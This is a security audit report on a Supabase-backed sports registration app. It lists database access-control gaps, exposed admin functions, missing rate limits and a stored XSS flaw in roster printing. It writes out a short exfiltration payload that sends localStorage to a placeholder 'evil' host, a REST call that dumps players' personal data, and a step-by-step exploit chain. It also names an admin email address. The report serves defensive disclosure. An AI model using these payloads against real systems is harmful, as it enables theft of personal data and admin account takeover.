# DPL 2026 — Security Audit Report

- Date: 2026-08-25
- Scope: full app (`src/`) + Supabase DB, edge functions, auth, storage, build artifacts
- Mode: read-only audit. No code/DB changes made.

**Headline:** The anon key in the client is safe *in principle* — BUT there is one table in the DB that is fully hackable with that public key: `registrations_backup_20260820`. All 109 players' PII (name, email, employee_id, photo) is dumpable/deletable by anyone. That is the real "hack the DB from the UI app" hole.

---

## CRITICAL

### C1. `registrations_backup_20260820` — RLS disabled, full anon read/write
- RLS is **off** on this backup table (Supabase advisor + linter both flag it, severity ERROR).
- The anon/publishable key (which sits in the public frontend bundle) grants `SELECT`/`INSERT`/`UPDATE`/`DELETE` on all **109 rows** of PII: names, emails, `employee_id`, photos.
- Any attacker: `GET /rest/v1/registrations_backup_20260820` → full data dump, or `DELETE` it.
- Likely created via dashboard as a backup and forgotten.

### C2. All `admin_*` RPCs are `SECURITY DEFINER` AND executable by `anon`
- Functions: `admin_players`, `admin_teams`, `admin_audit_log`, `admin_views_summary`, `admin_session_groups`, `admin_registration_intel`, `admin_edit_request_intel`, `admin_identity_trace`, `admin_anomaly_counts`.
- `SECURITY DEFINER` = runs as table owner, **bypasses RLS entirely**. Verified live grants: `anon` + `PUBLIC` can `EXECUTE` all of them.
- Currently saved only by an internal `where public.is_admin()` guard inside each function (verified — all 9 guarded today). Anon calls get empty results.
- Fragile-by-design: **one future unguarded definer function = full DB dump to anon**, no RLS to save you. Migration drift confirmed — `revoke all from public` was written in early migrations but later `create or replace` re-added `PUBLIC EXECUTE`.

## HIGH

### H1. Stored XSS → admin account takeover via roster printing
- Location: `src/admin/AdminPage.tsx` `printRoster`
- `document.write` interpolates `player.name` and `team.name` into raw HTML in a new window.
- Attacker registers with name like `<img src=x onerror="fetch('//evil?'+localStorage...)">` → when admin prints a squad roster, code executes in the **admin's browser context**, stealing the Supabase JWT from localStorage → full admin takeover.
- The confirmation email escapes HTML correctly; `printRoster` does not.

### H2. `send-confirmation` edge function = email relay
- `verify_jwt: true` but requires only *any* authenticated user; no rate limit, no check that the email is a real registration, no per-IP/account limit.
- If public signups are ever enabled → email-bombing + Resend cost abuse + reputation damage.

### H3. Zero rate limiting on all public write paths
- `registrations` INSERT (anon, `with check true`), `page_views` INSERT, `player_edit_requests` INSERT, `track-session` — all unbounded.
- Spam registration flooding, DB/analytics pollution, capacity exhaustion.
- `registrations.email` has **no unique constraint** → easy duplicate spam.

## MEDIUM

### M1. `sessions` table fully open to anon
- RLS policies: SELECT `true`, UPDATE `true`, INSERT `true`.
- Anyone can read all visitor fingerprints / ip_hash / geo / device AND rewrite them.
- Enables analytics tampering + identity-correlation poisoning (sessions feed the admin's anomaly/identity-trace feature).

### M2. `ip_geo` fully open to anon
- SELECT/INSERT/UPDATE all `true`. Geo-cache poisoning + IP-hash→city/ISP mapping readable publicly.

### M3. `track-session` edge function
- `verify_jwt: false`, CORS `*`, no validation, returns raw internal error messages (`internal: <msg>`), logs **plaintext IPs** to function logs.
- Abuse = fake sessions, storage/cost amplification, info disclosure.

### M4. `player_edit_requests` INSERT by anon with attacker-controlled `visitor_id`
- Poisons the anomaly-detection intel used by the admin.

### M5. Auth hardening off
- Leaked-password (HaveIBeenPwned) protection **disabled** (advisor WARN), no MFA on the single admin account (`umairbaig808@gmail.com`).
- Credential stuffing/phishing → full admin takeover.

### M6. Storage `player-photos`
- Public bucket, anon INSERT policy, no size/type/quota limits at the DB layer.
- Arbitrary file hosting, storage cost abuse, malware distribution vector.

### M7. `admin_users` readable by any authenticated user
- Policy `using (true)`. Enumerates the admin whitelist. Minor since the admin email is public, but unnecessary.

## LOW

- L1. `page_views` anon-INSERT spam (read is gated by `is_admin()` — OK).
- L2. Realtime `dpl-online` presence channel — public, leaks "N online".
- L3. `chart.tsx` `dangerouslySetInnerHTML` — static config-derived CSS, not user input. Low risk.
- L4. Public RPCs (`players_list`, `team_roster`, `auction_players`, `recent_registrations`, `player_cards`) are `SECURITY DEFINER` (RLS bypass) though they only expose non-PII profile fields. Works today, keeps fragile pattern alive.
- L5. `is_admin()` itself executable by anon — harmless (returns false) but unnecessary exposure.

## Done RIGHT (verified)
- No `service_role` / `sb_secret` key anywhere in repo, git history, or `dist/` bundle (scanned). Only anon key via `VITE_*` env.
- `.env.local` gitignored; `.env.example` has placeholders only.
- RLS enabled on all primary tables; all `admin_*` RPCs currently guarded by `is_admin()`.
- Confirmation-email HTML properly `escapeHtml`'d; React rendering escapes user content elsewhere.
- Registration audit trigger + `admin_audit` log exist.

## Worst-case exploit chain
1. Take the anon key from the JS bundle.
2. `GET /rest/v1/registrations_backup_20260820` → **full PII dump of all 109 players** (C1). Works right now, no credentials needed.
3. Register with a malicious name → trick admin into printing a roster → XSS → steal admin JWT → full DB admin access (H1).
